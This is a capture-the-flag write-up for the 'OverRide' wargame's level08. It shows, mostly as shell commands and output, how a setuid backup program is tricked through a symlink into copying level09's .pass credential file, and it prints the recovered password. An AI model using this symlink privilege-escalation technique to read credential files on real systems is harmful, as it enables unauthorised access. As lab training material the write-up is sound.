
## Solution
```
ln -s /home/users/level09/.pass password
level08@OverRide:~$ ./level08 password 
level08@OverRide:~$ cat backups/password 
```


## Execution

```
level08@OverRide:~$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
level08@OverRide:~$ ./level08 /home/users/level08/.pass
ERROR: Failed to open ./backups//home/users/level08/.pass

```

## Explanation

The programs take a file as an argument, opens it and creates a backupfile of it.  
When trying to open the pass file directly, it does not work because of the concatenation, which create 2 /.  
Let's try with a file in the current directory to the pass file.  
```
level08@OverRide:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08   100 Oct 19  2016 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
-rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass

level08@OverRide:~$ echo hello > test
-bash: test: Permission denied
level08@OverRide:~$ chmod 777 .
level08@OverRide:~$ echo hello > test
level08@OverRide:~$ ./level08 test
level08@OverRide:~$ cat backups/test 
hello
```

This works, and the log file in backup has the content of the test file we created.  
Let's try to create a backup file of the pass file, by creating a symlink to it.  

```
level08@OverRide:~$ ln -s /home/users/level09/.pass password
level08@OverRide:~$ ls -la
total 32
drwxrwxrwx+ 1 level08 level08   140 Nov  8 11:20 .
dr-x--x--x  1 root    root      260 Oct  2  2016 ..
drwxrwx---+ 1 level09 users      80 Nov  8 11:17 backups

-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
-rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass
lrwxrwxrwx  1 level08 level08    25 Nov  8 11:20 password -> /home/users/level09/.pass

level08@OverRide:~$ ./level08 password 
level08@OverRide:~$ cat backups/password 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```